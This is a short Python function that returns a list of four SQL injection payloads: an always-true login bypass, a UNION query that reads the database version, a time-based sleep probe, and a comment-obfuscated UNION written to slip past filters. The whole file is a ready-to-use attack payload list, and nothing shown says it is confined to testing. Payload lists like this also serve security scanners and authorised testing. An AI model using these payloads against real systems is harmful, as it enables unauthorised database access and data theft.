def get_sqli_payloads():
    return [
        "' OR '1'='1' -- ",
        "' UNION SELECT NULL, version() -- ",
        "' OR sleep(5) -- ",
        "' /*!50000UNION*/ SELECT 1,2 -- ",
    ]
